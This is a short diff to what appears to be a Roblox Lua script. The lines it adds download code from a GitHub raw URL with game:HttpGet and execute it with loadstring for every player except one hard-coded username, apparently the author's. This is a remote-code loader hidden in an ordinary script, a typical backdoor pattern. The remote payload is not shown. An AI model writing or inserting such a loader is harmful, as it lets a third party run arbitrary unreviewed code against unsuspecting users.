@@ -188,3 +188,11 @@ task.spawn(function()
         task.wait(1.5)
     end
 end)
+
+-- Check if the player's name is NOT "dapzkecoy"
+if player.Name ~= "dapzkecoy" then
+    -- Code runs for everyone except dapzkecoy
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/mrazep-droid/Repository/refs/heads/main/SRC/private-use2"))()
+else
+    -- Else nothing happens for dapzkecoy
+end
